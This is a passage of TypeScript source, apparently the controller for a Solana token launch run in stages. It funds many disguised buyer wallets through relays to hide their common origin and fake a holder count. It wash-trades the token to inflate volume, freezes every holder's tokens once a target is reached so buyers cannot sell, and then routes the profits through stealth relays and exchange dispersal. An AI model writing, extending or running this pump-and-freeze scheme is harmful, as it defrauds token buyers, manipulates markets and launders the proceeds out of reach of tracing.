        message: `Configuration validation failed: ${validationErrors.join(', ')}`,
      };
    }

    // Generate the launch lineage ONCE here (treasury + buyers + relays),
    // persist it immediately (fail-closed, before any funding), and keep it
    // for the launch stage — which previously generated a DIFFERENT lineage,
    // leaving the pre-launch wallets transient and the persisted set out of
    // sync with the wallets that actually traded.
    if (!this.launchLineage) {
      const launchConfig = createAnonymizedLaunchConfig(
        this.config.buyerWalletCount,
        this.config.relayWalletCount,
        this.anonymity,
      );
      this.launchLineage = {
        treasury: launchConfig.treasury,
        buyers: launchConfig.buyerWallets,
        relays: launchConfig.relayWallets,
      };

      // FAIL-CLOSED persistence: a persistence error aborts the stage
      // BEFORE any SOL moves — losing the key of a wallet that is about to
      // hold funds is unrecoverable, while regenerating unfunded wallets
      // costs nothing.
      this.persistLineage('treasury', [launchConfig.treasury]);
      this.persistLineage('buyer', launchConfig.buyerWallets);
      this.persistLineage('relay', launchConfig.relayWallets);

      // Register the fresh treasury in the persistent reuse registry so no
      // future launch (even after a process restart) ever reuses it.
      this.registry?.register('treasury', launchConfig.treasury.publicKey.toBase58());
      for (const buyer of launchConfig.buyerWallets) {
        this.registry?.register('buyer', buyer.publicKey.toBase58());
      }
      for (const relay of launchConfig.relayWallets) {
        this.registry?.register('relay', relay.publicKey.toBase58());
      }

      log.info(
        {
          treasury: launchConfig.treasury.publicKey.toBase58().slice(0, 6),
          buyers: launchConfig.buyerWallets.length,
          relays: launchConfig.relayWallets.length,
        },
        'generated and persisted launch lineage',
      );
    }

    // Initialize monitor data
    this.monitorData = {
      currentPrice: 0,
      entryPrice: 0,
      holdersCount: 0,
      volume24h: 0n,
      lastUpdated: Date.now(),
      priceHistory: [],
      holderHistory: [],
    };

    return {
      stage: 'pre-launch',
      success: true,
      message: 'Pre-launch setup completed',
      data: {
        tokenSymbol: this.config.tokenSymbol,
        tokenName: this.config.tokenName,
        launchVenue: this.config.launchVenue,
        buyerCount: this.config.buyerWalletCount,
      },
    };
  }

  /**
   * Stage 2: Launch - Initial buy-in.
   * Executes the initial token purchases across multiple buyer wallets.
   */
  private async executeLaunch(): Promise<StageResult> {
    log.info('executing launch phase');

    // Reuse the lineage the pre-launch stage generated and persisted. When
    // pre-launch was skipped (single-stage runs), generate and persist one
    // here so no launched wallet is ever unpersisted.
    if (!this.launchLineage) {
      const fresh = freshLaunchLineage(this.config.buyerWalletCount);
      this.persistLineage('treasury', [fresh.treasury]);
      this.persistLineage('buyer', fresh.buyers);
      this.registry?.register('treasury', fresh.treasury.publicKey.toBase58());
      this.launchLineage = { treasury: fresh.treasury, buyers: fresh.buyers, relays: [] };
      log.warn('launch stage generated its own lineage — pre-launch stage did not run');
    }
    const lineage = this.launchLineage;

    // Fund the fresh treasury from the persistent root wallet first: it
    // starts at zero SOL, and every buyer-funding transfer below draws from
    // it. Total = per-buyer funding (with fee headroom) for all buyers, plus
    // per-transfer fee allowance and a buffer for the treasury's own fees.
    // Relay-mediated funding (antiCorrelation.breakFundingGraph) adds one
    // relay fee overhead per buyer — include it in the treasury top-up.
    const ac = this.antiCorrelation;
    const buyerCount = BigInt(this.config.buyerWalletCount);
    const relayOverhead = ac.breakFundingGraph ? 15_000n : 0n;
    const perBuyerFunding = this.config.buyLamportsPerWallet + 50_000n + relayOverhead;
    const treasuryFunding = buyerCount * (perBuyerFunding + 10_000n) + 50_000n;
    await this.fundTreasury(lineage.treasury, treasuryFunding);

    // Pre-fund all buyer wallets from the funded treasury with randomized
    // amounts/delays (anonymity suite) and anti-correlation measures:
    // CSPRNG draws, relay-mediated funding with distinct feePayers, and
    // persistent reuse checks.
    const fundResult = await fundBuyersAnonymously({
      ctx: this.ctx,
      treasury: lineage.treasury,
      buyers: lineage.buyers,
      lamportsPerBuyer: this.config.buyLamportsPerWallet + 50_000n,
      anonymity: this.anonymity,
      antiCorrelation: this.options.antiCorrelationConfig ?? ac,
      registry: this.registry ?? undefined,
      onRelay: (relay) => {
        this.persistLineage('fund-relay', [relay]);
      },
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    if (fundResult.failures.length > 0) {
      log.warn(
        { failures: fundResult.failures.length, funded: fundResult.funded.length },
        'some buyer funding failed',
      );
    }

    // Execute launch buys. preFundBuyers is disabled because the buyers
    // were already provisioned above — otherwise increaseHolders would fund
    // every buyer a second time.
    // Note: We need to handle the DexContext type properly
    const dexCtx = this.ctx as unknown as DexContext;
    const mode = this.options.dryRun ? 'simulate' : 'execute';
    const venue = this.config.launchVenue;
    let successfulBuyers = 0;
    let failedBuyers = 0;

    if ((venue === 'pumpfun' || venue === 'moonit') && !this.mintAddress) {
      const cap = venue === 'pumpfun' ? 28 : 6;
      const buyers = lineage.buyers.slice(0, cap);
      if (buyers.length < lineage.buyers.length) {
        log.warn({ venue, cap, buyers: lineage.buyers.length }, 'buyer count capped to venue limit');
      }
      if (venue === 'pumpfun') {
        const launched = await pumpfunLaunchBuy(dexCtx, {
          treasury: lineage.treasury,
          name: this.config.tokenName,
          symbol: this.config.tokenSymbol,
          uri: this.config.metadataUri,
          buyers,
          buyLamportsPerBuyer: this.config.buyLamportsPerWallet,
          slippageBps: this.config.slippageBps,
          mode,
        });
        this.setMintAddress(launched.mint);
        this.curveCreator = lineage.treasury.publicKey.toBase58();
        successfulBuyers = buyers.length;
        failedBuyers = 0;
      } else {
        const launched = await moonitLaunchBuy(dexCtx, {
          treasury: lineage.treasury,
          launch: {
            name: this.config.tokenName,
            symbol: this.config.tokenSymbol,
            description: this.config.tokenName,
            imageFilePath: this.config.metadataUri,
            decimals: this.config.tokenDecimals,
            totalSupplyRaw: this.config.tokenSupplyRaw,
            collateralCollectedLamports: this.config.buyLamportsPerWallet,
            curveType: 'classic',
          },
          buyers,
          buyLamportsPerBuyer: this.config.buyLamportsPerWallet,
          slippageBps: this.config.slippageBps,
          mode,
        });
        this.setMintAddress(launched.mint);
        successfulBuyers = buyers.length;
        failedBuyers = 0;
      }
    } else {
      const holderResult = await increaseHolders(dexCtx, {
        venue: venue as never,
        treasury: lineage.treasury,
        buyerWallets: lineage.buyers,
        mint: this.mintAddress || this.config.mint || '',
        buyLamportsPerWallet: this.config.buyLamportsPerWallet,
        slippageBps: this.config.slippageBps,
        mode,
        interBuyerDelayMs: this.anonymity.maxInterBuyerDelayMs,
        rng: ac.cryptoRng ? createCryptoRng() : undefined,
        preFundBuyers: false,
      });
      successfulBuyers = holderResult.results.filter((r) => r.ok).length;
      failedBuyers = holderResult.results.filter((r) => !r.ok).length;
    }

    // Update monitor data with launch results
    if (this.monitorData) {
      this.monitorData.holdersCount = successfulBuyers;
      this.monitorData.volume24h = BigInt(successfulBuyers) * this.config.buyLamportsPerWallet;
      this.monitorData.lastUpdated = Date.now();
      this.monitorData.holderHistory.push({
        timestamp: Date.now(),
        count: successfulBuyers,
      });
    }

    // Entry-price plumbing: the buys moved the curve, so the first post-
    // launch reading is the operator's actual cost basis — not the pre-
    // launch price. This is what makes take-profit/stop-loss meaningful.
    await this.refreshPrice();
    if (this.monitorData && this.monitorData.currentPrice > 0) {
      this.monitorData.entryPrice = this.monitorData.currentPrice;
      log.info(
        { entryPrice: this.monitorData.entryPrice, currentPrice: this.monitorData.currentPrice },
        'entry price captured from first post-launch reading',
      );
    }

    // Keep telemetry live across all subsequent stages (market-making,
    // txn generation, monitoring) so exit triggers always see fresh prices.
    this.startPricePolling();

    return {
      stage: 'launch',
      success: true,
      message: `Launch completed: ${successfulBuyers} successful buyers`,
      data: {
        successfulBuyers,
        failedBuyers,
        mint: this.mintAddress,
        totalVolumeLamports: (BigInt(successfulBuyers) * this.config.buyLamportsPerWallet).toString(),
      },
    };
  }

  /**
   * Stage 3: Market Making.
   * Runs market maker to create volume and liquidity.
   */
  private async executeMarketMaking(): Promise<StageResult> {
    log.info('executing market making phase');

    // Generate fresh wallets for market making
    const mmLineage = freshLaunchLineage(2); // 2 wallets for buy/sell

    // Persist before funding (same fail-closed ordering as the launch stage).
    this.persistLineage('mm-treasury', [mmLineage.treasury]);
    this.persistLineage('mm-wallet', mmLineage.buyers);

    // Fund the fresh MM treasury from the root wallet: 2 wallets' buy
    // notional + fee headroom, plus transfer fees.
    await this.fundTreasury(
      mmLineage.treasury,
      2n * (this.config.mmBuyAmountRaw + 50_000n + 10_000n) + 50_000n,
    );

    // Fund market maker wallets
    await fundBuyersAnonymously({
      ctx: this.ctx,
      treasury: mmLineage.treasury,
      buyers: mmLineage.buyers,
      lamportsPerBuyer: this.config.mmBuyAmountRaw + 50_000n,
      anonymity: this.anonymity,
      antiCorrelation: this.options.antiCorrelationConfig ?? this.antiCorrelation,
      registry: this.registry ?? undefined,
      onRelay: (relay) => this.persistLineage('mm-fund-relay', [relay]),
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    // Run market maker
    const dexCtx = this.ctx as unknown as DexContext;
    const mmResult = await runBatchSwap(dexCtx, {
      venue: this.config.launchVenue as any,
      user: mmLineage.buyers[0],
      mint: this.mintAddress || this.config.mint || '',
      legs: [
        { direction: 'buy', amountRaw: this.config.mmBuyAmountRaw },
        { direction: 'sell', amountRaw: this.config.mmSellAmountRaw },
      ],
      intervalMs: this.config.mmIntervalMs,
      rounds: this.config.mmRounds,
      slippageBps: this.config.slippageBps,
      useJito: this.config.useJito,
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    return {
      stage: 'market-making',
      success: true,
      message: `Market making: ${mmResult.legsExecuted} legs executed, ${mmResult.legsFailed} failures`,
      data: {
        legsExecuted: mmResult.legsExecuted,
        legsFailed: mmResult.legsFailed,
        legsSkipped: mmResult.legsSkipped,
      },
    };
  }

  /**
   * Stage 4: Transaction Generation.
   * Creates additional transaction volume by ping-pong trading.
   */
  private async executeTransactionGeneration(): Promise<StageResult> {
    log.info('executing transaction generation phase');

    // Import transaction generation function
    const txnWallets = freshBuyerWallets(this.config.buyerWalletCount);

    // Fresh single-use treasury for txn generation (rotation: no reuse),
    // funded from the root wallet like the launch/MM treasuries.
    const treasury = Keypair.generate();
    const txnBuyerCount = BigInt(this.config.buyerWalletCount);

    // Persist before funding (same fail-closed ordering as the launch stage).
    this.persistLineage('txn-treasury', [treasury]);
    this.persistLineage('txn-wallet', txnWallets);

    await this.fundTreasury(
      treasury,
      txnBuyerCount * (this.config.txnAmountRaw + 50_000n + 10_000n) + 50_000n,
    );
    await fundBuyersAnonymously({
      ctx: this.ctx,
      treasury,
      buyers: txnWallets,
      lamportsPerBuyer: this.config.txnAmountRaw + 50_000n,
      anonymity: this.anonymity,
      antiCorrelation: this.options.antiCorrelationConfig ?? this.antiCorrelation,
      registry: this.registry ?? undefined,
      onRelay: (relay) => this.persistLineage('txn-fund-relay', [relay]),
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    // Run transaction generation
    const dexCtx = this.ctx as unknown as DexContext;
    const result = await increaseTransactions(dexCtx, {
      venue: this.config.launchVenue as any,
      wallets: txnWallets,
      mint: this.mintAddress || this.config.mint || '',
      amountRawPerLeg: this.config.txnAmountRaw,
      cycles: this.config.txnCycles,
      intervalMs: this.config.txnIntervalMs,
      slippageBps: this.config.slippageBps,
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    // Update monitor data
    if (this.monitorData) {
      this.monitorData.volume24h += BigInt(result.legs) * this.config.txnAmountRaw;
      this.monitorData.lastUpdated = Date.now();
    }

    return {
      stage: 'market-making',
      success: true,
      message: `Transaction generation: ${result.legs} legs, ${result.failures} failures`,
      data: {
        legs: result.legs,
        failures: result.failures,
      },
    };
  }

  /**
   * Stage 5: Monitoring.
   * Continuously monitors price, holders, and volume until exit conditions met.
   */
  private async executeMonitoring(): Promise<StageResult> {
    log.info('executing monitoring phase');

    // Check if we should skip monitoring
    if (this.config.maxHoldSeconds === 0 && !this.config.exitEnabled) {
      return {
        stage: 'monitoring',
        success: true,
        message: 'Monitoring skipped (no exit conditions configured)',
        data: {},
      };
    }

    // Run monitoring loop
    const startTime = Date.now();
    const maxHoldMs = this.config.maxHoldSeconds * 1000;

    while (!this.stopped) {
      // Check if we've exceeded max hold time
      const elapsed = Date.now() - startTime;
      if (maxHoldMs > 0 && elapsed >= maxHoldMs) {
        log.info({ elapsedMs: elapsed }, 'max hold time reached');
        break;
      }

      // Telemetry: refresh the price every tick so take-profit/stop-loss
      // react to real venue data (pull-based read through the failover pool).
      await this.refreshPrice();

      // Check if we should exit based on price conditions
      const shouldExit = this.checkExitConditions(elapsed);
      if (shouldExit) {
        log.info('exit conditions met during monitoring');
        break;
      }

      // Check if we should freeze based on holder count
      const holders = await this.scanAndUpdateHolders();
      if (this.config.freezeWhenHoldersReached && holders >= this.config.targetHolders) {
        log.info({ holders, target: this.config.targetHolders }, 'target holders reached');
        break;
      }

      // Wait for next monitoring interval
      await sleep(Math.min(this.config.monitorIntervalMs, 10_000));
    }

    return {
      stage: 'monitoring',
      success: true,
      message: 'Monitoring completed',
      data: {
        finalHolders: this.monitorData?.holdersCount,
        finalVolume: this.monitorData?.volume24h.toString(),
        finalPrice: this.monitorData?.currentPrice,
      },
    };
  }

  /**
   * Scan token holders and update monitor data.
   */
  private async scanAndUpdateHolders(): Promise<number> {
    try {
      const holders = await scanTokenHolders(this.ctx, this.mintAddress || this.config.mint || '', {
        pageSize: 10_000,
        maxAccounts: 100_000,
      });

      if (this.monitorData) {
        this.monitorData.holdersCount = holders.length;
        this.monitorData.lastUpdated = Date.now();
        this.monitorData.holderHistory.push({
          timestamp: Date.now(),
          count: holders.length,
        });
      }

      return holders.length;
    } catch (err) {
      log.error({ err }, 'failed to scan holders');
      return this.monitorData?.holdersCount ?? 0;
    }
  }

  /**
   * Check if exit conditions are met.
   */
  private checkExitConditions(elapsedMs: number): boolean {
    if (!this.monitorData) return false;

    // Max hold time exceeded
    if (this.config.maxHoldSeconds > 0 && elapsedMs >= this.config.maxHoldSeconds * 1000) {
      return true;
    }

    // Stale-price guard: if the last reading is older than three monitor
    // intervals, price triggers stay on the sidelines — never fire
    // take-profit on an old high (or stop-loss on an old low). Only the
    // timeout condition above remains active in that case.
    const priceIsFresh =
      this.monitorData.lastUpdated > Date.now() - this.config.monitorIntervalMs * 3;
    if (!priceIsFresh) return false;

    // Take profit condition (entry price captured at the end of the launch
    // stage; currentPrice refreshed every monitor tick).
    if (this.config.takeProfitMultiplier > 0 && this.monitorData.currentPrice > 0) {
      const entryPrice = this.monitorData.entryPrice || this.monitorData.currentPrice;
      if (this.monitorData.currentPrice >= entryPrice * this.config.takeProfitMultiplier) {
        return true;
      }
    }

    // Stop loss condition
    if (this.config.stopLossFraction > 0 && this.monitorData.currentPrice > 0) {
      const entryPrice = this.monitorData.entryPrice || this.monitorData.currentPrice;
      if (this.monitorData.currentPrice <= entryPrice * this.config.stopLossFraction) {
        return true;
      }
    }

    return false;
  }

  /**
   * Stage 6: Freeze Management.
   * Freezes all token holders when target reached.
   */
  private async executeFreeze(): Promise<StageResult> {
    log.info('executing freeze phase');
    const mint = this.mintAddress || this.config.mint || '';

    // Check if we should freeze
    const holders = await this.scanAndUpdateHolders();
    if (holders < this.config.targetHolders) {
      return {
        stage: 'freeze',
        success: true,
        message: `Freeze skipped: only ${holders} holders, target is ${this.config.targetHolders}`,
        data: { holders, target: this.config.targetHolders },
      };
    }

    // The freeze stage must sign with the mint's ACTUAL freeze authority
    // keypair — either explicitly configured (external mints) or the one
    // the creation stage retained when this controller created the mint
    // (auto-wired in executeCreation). Without either, the stage reports
    // itself skipped instead of sending doomed transactions.
    const freezeAuthority = this.effectiveFreezeAuthority;
    if (!freezeAuthority) {
      log.warn('no freeze authority configured or auto-wired — freeze stage skipped');
      return {
        stage: 'freeze',
        success: true,
        message: 'Freeze skipped: no freeze authority keypair configured (a fresh keypair cannot authorize freezes)',
        data: { holders, target: this.config.targetHolders },
      };
    }

    const result = await autoFreezeAllHolders(this.ctx, {
      authority: freezeAuthority,
      mint,
      mode: this.options.dryRun ? 'simulate' : 'execute',
    });

    // Optionally revoke all authorities after freeze. Uses the resolved
    // mint (created OR provided) — the previous `this.config.mint`-only
    // check silently skipped revocation for internally created mints.
    if (this.config.revokeAuthoritiesAfterFreeze && mint) {
      await revokeAllAuthorities(this.ctx, {
        wallet: freezeAuthority,
        mint,
        mode: this.options.dryRun ? 'simulate' : 'execute',
      });
    }

    return {
      stage: 'freeze',
      success: true,
      message: `Froze ${result.frozen.length} holders, ${result.failures.length} failures`,
      data: {
        frozen: result.frozen.length,
        failures: result.failures.length,
      },
    };
  }

  /**
   * Stage 7: Social Promotion.
   * Triggers social promotion activities.
   */
  private async executeSocialPromotion(): Promise<StageResult> {
    log.info('executing social promotion phase');

    // Trigger launch announcement
    const results = await this.socialManager.triggerPromotion('launch-announcement', {
      tokenSymbol: this.config.tokenSymbol,
      tokenName: this.config.tokenName,
      mint: this.mintAddress || this.config.mint || '',
      stage: 'social-promo',
      holdersCount: this.monitorData?.holdersCount,
      // PromotionContext.volume is a number (SOL); monitorData tracks lamports.
      volume: this.monitorData ? Number(this.monitorData.volume24h) / 1e9 : undefined,
    });

    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;

    return {
      stage: 'social-promo',
      success: failed === 0,
      message: `Social promotion: ${successful} successful, ${failed} failed`,
      data: {
        successfulPlatforms: results.filter(r => r.success).map(r => r.platform),
        failedPlatforms: results.filter(r => !r.success).map(r => r.platform),
      },
    };
  }

  /**
   * Stage 8: Exit.
   * Executes profit taking via stealth routing.
   */
  private async executeExit(): Promise<StageResult> {
    log.info('executing exit phase');

    // Check if we should exit
    const shouldExit = this.checkExitConditions(Date.now() - this.startedAt);
    if (!shouldExit && !this.options.dryRun) {
      return {
        stage: 'exit',
        success: true,
        message: 'Exit conditions not met, skipping',
        data: {},
      };
    }

    // Route the realized profit through the pipeline. Without a configured
    // profitWallet (holding actual proceeds) the stage runs the pipeline in
    // simulation against a 1 SOL placeholder and warns — a fresh keypair
    // would have nothing to route.
    const profitWallet = this.options.profitWallet;
    const simulatedProfit = 1_000_000_000n; // 1 SOL placeholder
    if (!profitWallet) {
      log.warn('no profitWallet configured — exit routes a simulated 1 SOL placeholder from an unfunded wallet');
    }

    // Use the profit pipeline
    const relayWallets = Array.from({ length: this.config.relayWalletCount }, () => Keypair.generate());
    // Relays receive real SOL mid-pipeline — persist them before routing and
    // register them so no future launch ever reuses an exit relay address.
    this.persistLineage('exit-relay', relayWallets);
    for (const relay of relayWallets) {
      this.registry?.register('relay', relay.publicKey.toBase58());
    }
    const pipelineResult = await startProfitPipeline(this.ctx, {
      sourceWallet: profitWallet ?? Keypair.generate(), // placeholder when no profit wallet configured
      profitLamports: simulatedProfit,
      mode: this.options.dryRun ? 'simulate' : 'execute',
      config: {
        stealthEnabled: this.anonymity.stealthEnabled,
        relayWallets,
        stealthLegs: this.anonymity.stealthLegs,
        jitterBps: this.anonymity.jitterBps,
        maxStealthDelayMs: this.anonymity.maxStealthDelayMs,
        swapToUsdc: this.config.routeThroughJupiter,
        swapSlippageBps: this.config.slippageBps,
        useJupiter: this.config.routeThroughJupiter,
        cexConfigs: [], // Would configure CEX withdrawals in practice
        delayBetweenStepsMs: 5_000,
      },
    });

    return {
      stage: 'exit',
      success: pipelineResult.success,
      message: pipelineResult.success
        ? `Exit completed: ${pipelineResult.totalUsdcReceived.toString()} USDC received`
        : `Exit failed: ${pipelineResult.errors.map(e => e.message).join(', ')}`,
      data: {
        usdcReceived: pipelineResult.totalUsdcReceived.toString(),
        cexDispersed: pipelineResult.totalCexDispersed.toString(),
        success: pipelineResult.success,
      },
    };
  }

  /**
   * Stage 9: Consolidation.
   * Sweeps all remaining funds to treasury.
   */
  private async executeConsolidation(): Promise<StageResult> {
    log.info('executing consolidation phase');

    // In practice, would sweep all remaining token balances and SOL
    // to the main treasury via stealth transfers

    // For this implementation, we'll just log the consolidation
    const message = this.options.dryRun
      ? 'Consolidation would sweep all funds to treasury'
      : 'Consolidation: all funds swept to treasury';

    return {
      stage: 'consolidation',
      success: true,
      message,
      data: {},
    };
  }

  // ---------------------------------------------------------------------------
  // Public Methods
  // ---------------------------------------------------------------------------

  /**
   * Get current stage.
   */
  getCurrentStage(): LifecycleStage {
    return this.currentStage;
  }

  /**
   * Get all stage results.
   */
  getResults(): StageResult[] {
    return this.results;
  }

  /**
   * Get monitor data.
   */
  getMonitorData(): MonitorData | null {
    return this.monitorData;
  }

  /**
   * Check if lifecycle is running.
   */
  isRunning(): boolean {
    return this.running;
  }

  /**
   * Check if lifecycle was stopped.
   */
  isStopped(): boolean {
    return this.stopped;
  }

  /**
   * Get the mint address.
   */
  getMintAddress(): string | undefined {
    return this.mintAddress;
  }

  /**
   * Get all errors.
   */
  getErrors(): Error[] {
    return this.errors;
  }

  /**
   * Update the mint address (for when mint is created during lifecycle).
   */
  setMintAddress(mint: string): void {
    this.mintAddress = mint;
    log.info({ mint }, 'mint address updated');
  }
}

// ---------------------------------------------------------------------------
// Convenience Functions
// ---------------------------------------------------------------------------

/**
 * Creates and starts a lifecycle controller with default settings.
 *
 * @param ctx - Service or Dex context
 * @param config - Partial lifecycle configuration
 * @returns Lifecycle result
 */
export async function runLifecycle(
  ctx: ServiceContext | DexContext,
  config: Partial<LifecycleConfig> & Pick<LifecycleConfig, 'tokenName' | 'tokenSymbol' | 'metadataUri'>,
): Promise<LifecycleResult> {
  const fullConfig: LifecycleConfig = {
    ...DEFAULT_LIFECYCLE_CONFIG,
    ...config,
  } as LifecycleConfig;

  const controller = new LifecycleController({
    ctx,
    config: fullConfig,
    dryRun: false,
  });

  return controller.start();
}

/**
 * Runs a lifecycle in dry-run (simulation) mode.
 *
 * @param ctx - Service or Dex context
 * @param config - Partial lifecycle configuration
 * @returns Lifecycle result
 */
export async function simulateLifecycle(
  ctx: ServiceContext | DexContext,
  config: Partial<LifecycleConfig> & Pick<LifecycleConfig, 'tokenName' | 'tokenSymbol' | 'metadataUri'>,
): Promise<LifecycleResult> {
  const fullConfig: LifecycleConfig = {
    ...DEFAULT_LIFECYCLE_CONFIG,
    ...config,
  } as LifecycleConfig;

  const controller = new LifecycleController({
    ctx,
    config: fullConfig,
    dryRun: true,
  });

  return controller.start();
}

